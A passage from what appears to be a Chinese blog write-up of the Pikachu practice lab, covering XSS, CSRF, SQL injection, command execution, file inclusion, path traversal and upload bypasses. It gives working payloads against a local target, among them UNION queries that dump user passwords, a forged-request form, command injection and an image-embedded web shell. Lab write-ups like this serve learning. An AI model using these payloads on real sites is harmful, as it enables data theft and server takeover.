punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//            alert($ms);</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以得知$ms即是我们在文本框写入的内容， 且此内容在js标签内，所以我们需要闭合一下</p><p>构造  <!--</script><script>alert("我是弹窗")</script>--></p><p>得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312145532.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="一、概述-1"><a href="#一、概述-1" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>CSRF(跨站请求伪造)概述</p><p>​                        Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>​      <strong>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</strong>                    </p><p>​      因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>​                        –对敏感信息的操作增加安全的token；<br>​                        –对敏感信息的操作增加安全的验证码；<br>​                        –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p></blockquote><h3 id="二、CSRF-get"><a href="#二、CSRF-get" class="headerlink" title="二、CSRF(get)"></a>二、CSRF(get)</h3><p>根据提示，得到了几个用户，我们如概述那般，先登录vince用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312145987.png"></p><p>修改vince用户的个人信息并利用BP抓包!<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146599.png"></p><p>发现没有token验证，然后将add修改为chain80</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146030.png"></p><p>然后复制url <strong>&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545453&amp;add&#x3D;chain80&amp;email&#x3D;vince%40pikachu.com&amp;submit&#x3D;submit</strong></p><p>我们再登录kobe用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146037.png"></p><p>修改url，kobe的信息被修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146544.png"></p><h3 id="三、CSRF-POST"><a href="#三、CSRF-POST" class="headerlink" title="三、CSRF(POST)"></a>三、CSRF(POST)</h3><p>与上题差不多，不过此题是以post传参，我们先登一个lili用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301456781.png"></p><p>然后利用BP抓包修改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301457290.png"></p><p>因为post无法像get那般，所以我们需要自己创建一个恶意站点，在pikachu文件夹vul&#x2F;csrf&#x2F;csrfpost下创建一个html文件，使被攻击用户点击</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  //这一处因人而异<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>18656565545<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>US<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lili@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们登录vince用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301503808.png"></p><p>访问这个html文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301509363.png"></p><h3 id="四、CSRF-Token"><a href="#四、CSRF-Token" class="headerlink" title="四、CSRF(Token)"></a>四、CSRF(Token)</h3><p>由于token回显在每次发送请求都是不一样且完全随机的，且后台会对每次生成的token进行验证， 故我们无法通过伪造URL使被攻击者遭到CSRF攻击，以本人目前能力，无法复现</p><p>由此也可见。token保护是一个很好防御CSRF的方法。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="一、概述-2"><a href="#一、概述-2" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。       </p><p>​                 在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>​                    1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>​                    2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>​                    3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!                    </p></blockquote><h3 id="二、数字型注入-post"><a href="#二、数字型注入-post" class="headerlink" title="二、数字型注入(post)"></a>二、数字型注入(post)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301520325.png"></p><p>数字分别代表的就是CSRF中那六个用户，我们直接抓包拼接sql语句</p><p>因为只是数字型，直接联合查询就好</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301523787.png"></p><h3 id="三、字符型注入（get）"><a href="#三、字符型注入（get）" class="headerlink" title="三、字符型注入（get）"></a>三、字符型注入（get）</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301524891.png"></p><p>我们需要判断是单引号闭合还是双引号闭合，</p><p>当我们输入双引号时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301526744.png"></p><p>当我们输入单引号时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301527016.png"></p><p>构造语句      <strong>1’ union select username,password from pikachu.users#</strong></p><p>得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301528761.png"></p><h3 id="四、搜索型注入"><a href="#四、搜索型注入" class="headerlink" title="四、搜索型注入"></a>四、搜索型注入</h3><p>本次注入，就是你还需要去判断一下有几个列</p><p>当我们判断它有三个列时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301530849.png"></p><p>判断它有四个列时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301531100.png"></p><p>所以本题有三个列，则 在第三题的基础上再加修改</p><p>构造语句  <strong>1’ union select username,password,3 from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301532817.png"></p><h3 id="五、xx型注入"><a href="#五、xx型注入" class="headerlink" title="五、xx型注入"></a>五、xx型注入</h3><p>根据提示，这题就是不管他是什么型，使你所写的sql语句能闭合上，</p><p>即构造 <strong>1’) union select username,password from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301544492.png"></p><h3 id="六、”insert-x2F-update”注入"><a href="#六、”insert-x2F-update”注入" class="headerlink" title="六、”insert&#x2F;update”注入"></a>六、”insert&#x2F;update”注入</h3><p>我们需要先注册一个账号</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301545889.png"></p><p>而根据本题题目 insert和update其实都是sql语句的一种，前者用于添加，后者用于修改</p><p>进行BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301547592.png"></p><p>然后构造语句进行报错注入，此时不能再在语句后加入注释符</p><p><strong>know5’ or updatexml(1,concat(0x7e,database()),0) or ‘</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301553046.png"></p><p>修改个人信息也是如此</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301554840.png"></p><h3 id="七、”delete注入”"><a href="#七、”delete注入”" class="headerlink" title="七、”delete注入”"></a>七、”delete注入”</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301555856.png"></p><p>点击删除后抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301556185.png"></p><p>由于本题编码问题，所以我们需要用+替换空格，与上题一样，利用报错注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301559576.png"></p><h3 id="八、http头注入"><a href="#八、http头注入" class="headerlink" title="八、http头注入"></a>八、http头注入</h3><p>即http头的某个值带入sql语句使其注入</p><p>进行BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301628554.png"></p><p>单引号出现报错，所以构造报错注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301629597.png"></p><h3 id="九、布尔盲注"><a href="#九、布尔盲注" class="headerlink" title="九、布尔盲注"></a>九、布尔盲注</h3><p>利用substr构造语句，结合我们在刚才注入时已知的那几个用户，可以通过此语句查询到他们的信息</p><p>lili’ and ascii(substr(database(),1,1))&#x3D;112#</p><p>意思就是判断数据库名称的第一个字符是否等于小写字母<code>p</code>，如果相等，则返回True（即条件成立），否则返回False（即条件不成立）。。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301636136.png"></p><h3 id="十、时间盲注"><a href="#十、时间盲注" class="headerlink" title="十、时间盲注"></a>十、时间盲注</h3><p>时间盲注一般通过if语句，通过延迟的信息进行判断</p><p><strong>1’ and if(substr(database(),1,1)&#x3D;’p’,sleep(5),null)#</strong> 即<code>substr(database(), 1, 1)</code> 是函数 <code>database()</code> 截取第一个字符   **if(substr(database(),1,1)&#x3D;’p’,sleep(5),null)# ** 如果第一个字符是 ‘p’，则执行 <code>sleep(5)</code> 延迟5秒；反之则返回null</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301648294.png"></p><p><strong>lili’ and if ((substr(database(),1,1))&#x3D;’p’,sleep&#x3D;(5),null)#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301648804.png"></p><h3 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h3><p>使用BP抓包</p><p>由于魔术引号的存在，需要在其前面加一个%df</p><p>即构造如下语句 <strong>1%df’ union select username,password from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301655472.png"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="一、概述-3"><a href="#一、概述-3" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p><strong>远程系统命令执行</strong><br>        一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>         比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-                    </p><p>  <strong>远程代码执行</strong><br>                        同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。                   </p><p>​                        不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。                    </p><p>​                        因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。                    </p></blockquote><h3 id="二、exec-“ping”"><a href="#二、exec-“ping”" class="headerlink" title="二、exec “ping”"></a>二、exec “ping”</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301659965.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301700292.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301702635.png"></p><p>在后面加上 &amp;whoaimi  就可以执行whoami指令</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301701854.png"></p><h3 id="三、exec-“eval”"><a href="#三、exec-“eval”" class="headerlink" title="三、exec “eval”"></a>三、exec “eval”</h3><p>在上输入phpinfo();指令 得到回显，不局限于这个指令，你system(“ipconfig”)也能在上面回显出内容</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301734866.png"></p><h2 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h2><h3 id="一、概述-4"><a href="#一、概述-4" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：<br> include(),include_once()<br> require(),require_once()<br>            这些文件包含函数，这些函数在代码设计中被经常使用到。<br>            大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。                        但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。</p><p>​            根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>​                        <strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>​                        <strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。                    </p><p>​             因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                                        </p></blockquote><h3 id="二、File-Inclusion-local"><a href="#二、File-Inclusion-local" class="headerlink" title="二、File Inclusion(local)"></a>二、File Inclusion(local)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061119220.png"></p><p>随便点一个提交发现得到回显，</p><p>从上面url我们可以发现文件名  <strong>file5.php</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061241190.png"></p><p>这些文件一般都是后台存在的文件，但此题是本地文件包含漏洞，我们可以通过修改上方的url来访问</p><p>可以通过在前面多个**..&#x2F;**来跳转到根目录</p><p>类似于  <strong>..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061256539.png"></p><p>按此路径也可以找到文件</p><p>或者在pikachu靶场里的<strong>include</strong>文件夹找到这几个回显出来的php文件</p><p>我们在里面建立一个txt文件可以成功访问</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061259377.png"></p><h3 id="三、File-Inclusion-remote"><a href="#三、File-Inclusion-remote" class="headerlink" title="三、File Inclusion(remote)"></a>三、File Inclusion(remote)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061259481.png"></p><p>我们先去php.ini文件将<strong>allow_url_include</strong>改成<strong>On</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061524150.png"></p><p>打开后和第一题一样的回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061525195.png"></p><p>不过可以在url上看到include</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061526309.png"></p><p>然后我们可以就此修改去访问另一个网站的文件，比如</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061531014.png"></p><p>访问成功</p><h2 id="Unsafe-Filedownload（不安全的文件下载）"><a href="#Unsafe-Filedownload（不安全的文件下载）" class="headerlink" title="Unsafe Filedownload（不安全的文件下载）"></a>Unsafe Filedownload（不安全的文件下载）</h2><h3 id="一、概述-5"><a href="#一、概述-5" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。</p><p>如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。                     </p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。切记：所有与前端交互的数据都是不安全的，不能掉以轻心！                                    </p></blockquote><h3 id="二、Unsafe-Filedownload"><a href="#二、Unsafe-Filedownload" class="headerlink" title="二、Unsafe Filedownload"></a>二、Unsafe Filedownload</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061533745.png"></p><p>如Notice所说，如果点击图片下方名字即会下载图片，其他无线索，所以我们先点击一个图片，然后通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061539296.png">然后将<strong>filename</strong>后面的值修改为 <strong>..&#x2F;test.php</strong>（这个php文件是我自己创的并放在上级目录) </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061543372.png"></p><p>然后成功下载</p><h2 id="Unsafe-Fileupload（文件上传漏洞）"><a href="#Unsafe-Fileupload（文件上传漏洞）" class="headerlink" title="Unsafe Fileupload（文件上传漏洞）"></a>Unsafe Fileupload（文件上传漏洞）</h2><h3 id="一、概述-6"><a href="#一、概述-6" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                    </p><p> 所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>              –验证文件类型、后缀名、大小;<br>              –验证文件的上传方式;<br>              –对文件进行一定复杂的重命名;<br>              –不要暴露文件上传后的路径;<br>              –等等…</p></blockquote><h3 id="二、client-check-客户端check"><a href="#二、client-check-客户端check" class="headerlink" title="二、client check(客户端check)"></a>二、client check(客户端check)</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p>先上传一个jpg图片里面写着phpinfo()函数，然后点击的一瞬间通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061605727.png"></p><p>将jpg后缀修改为php后缀并发送</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061605976.png"></p><p>然后访问该地址，得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061606856.png"></p><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>用F12打开代码页面将<strong>onchange</strong>删除</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061608603.png"></p><p>然后直接上传php文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061609890.png"></p><p>访问得到与上题一样的回显</p><h3 id="三、MIME-type"><a href="#三、MIME-type" class="headerlink" title="三、MIME type"></a>三、MIME type</h3><p>本题即是利用将php文件通过BP抓包上传后，改变文件类型为图片类型以此来达到上传目的</p><p>我们先BP抓包一个php文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061612615.png"></p><p>即将此修改为 <strong>image&#x2F;jpeg</strong>    然后上传成功</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061617198.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061614928.png"></p><p>访问一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061615338.png"></p><p>上传成功</p><h3 id="四、getimagesize"><a href="#四、getimagesize" class="headerlink" title="四、getimagesize()"></a>四、getimagesize()</h3><blockquote><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p></blockquote><p><code>getimagesize()</code>函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部</p><p>所以我们可以通过文件幻术头来进行图片上传</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202309052028233.png"></p><p>利用文件包含漏洞解析此图片木马: <code>http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/09/05/29522464f71e89dc8e3484901611.jpg&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202309052035495.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB,十大常见漏洞,学习心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF里WEB题中的POP链</title>
      <link href="/2023/06/04/CTF%E9%87%8CWEB%E9%A2%98%E4%B8%AD%E7%9A%84POP%E9%93%BE/"/>
      <url>/2023/06/04/CTF%E9%87%8CWEB%E9%A2%98%E4%B8%AD%E7%9A%84POP%E9%93%BE/</url>
      
